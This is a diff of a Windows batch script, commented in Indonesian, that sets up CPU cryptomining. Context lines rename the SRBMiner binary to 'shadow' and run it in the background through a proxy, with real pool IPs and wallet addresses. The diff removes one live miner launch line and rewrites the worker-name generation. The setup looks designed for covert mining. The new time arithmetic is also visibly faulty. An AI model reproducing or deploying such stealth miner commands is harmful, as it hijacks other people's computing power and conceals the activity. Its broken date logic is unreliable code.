@@ -31,11 +31,29 @@
 #mv SRBMiner-MULTI shadow && ./shadow --algorithm xelishashv2_pepew --disable-gpu --pool 103.249.70.7:5778 --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc --worker cpuXidx --password c=LTC,ID=8Xpepew --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 8
 #mv SRBMiner-MULTI shadow && ./shadow --algorithm yespower2b --disable-gpu --pool 103.249.70.7:7445 --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc --worker cpuXidx --password c=LTC,ID=6Xmbc --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 6
 
-REM Mendapatkan waktu dalam format ddMMyyHHmm untuk timezone Asia/Jakarta
-for /f "tokens=2 delims==" %%A in ('"tzutil /g && tzutil /s "SE Asia Standard Time""') do set OLDTZ=%%A
-tzutil /s "SE Asia Standard Time"
-for /f "tokens=1-5 delims=/: " %%A in ('echo %date% %time%') do set datetime=%%A%%B%%C%%D%%E
-tzutil /s "%OLDTZ%"
+setlocal enabledelayedexpansion
+
+REM Mendapatkan waktu UTC dalam format ddMMyyHHmm
+for /f "tokens=2 delims==" %%A in ('wmic os get localdatetime /value ^| find "="') do set datetime=%%A
+set UTCDate=%datetime:~6,2%%datetime:~4,2%%datetime:~2,2%
+set UTCTime=%datetime:~8,2%%datetime:~10,2%
+set resultUTC=%UTCDate%%UTCTime%
+
+REM Menghitung offset waktu untuk Asia/Jakarta (+7 jam)
+set /a hour=1%UTCTime:~0,2% + 7
+if !hour! geq 24 (
+    set /a hour-=24
+    set /a day=1%UTCDate:~0,2% + 1
+    set UTCDate=!day!!UTCDate:~2!
+)
+
+REM Format hasil dengan zero-padding
+set hour=0!hour!
+set formattedTime=!hour:~-2!!UTCTime:~2,2!
+set formattedDate=%UTCDate%
+
+REM Menggabungkan tanggal dan waktu lokal Asia/Jakarta
+set localDateTime=%formattedDate%%formattedTime%
 
 REM Menghasilkan 7 karakter acak alfabet besar
 set rndchars=
@@ -44,7 +62,5 @@ for /l %%A in (1,1,7) do (
     for /f %%B in ('powershell -Command "[char]!rndnum!"') do set rndchars=!rndchars!%%B
 )
 
-REM Menggabungkan hasil
-set result=%datetime%%rndchars%
-
- --algorithm verushash --pool 149.56.27.47:3956,139.99.123.225:3956,79.137.70.48:3956 --wallet RWsSEGpV2E6yYa3UZ8fTE17FE3ZzMWzRAs --worker %result% --password x --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --disable-gpu --cpu-threads-intensity 2 --cpu-threads 6 --proxy 98.181.137.80:4145
+REM Menggabungkan hasil akhir
+set result=%localDateTime%%rndchars%
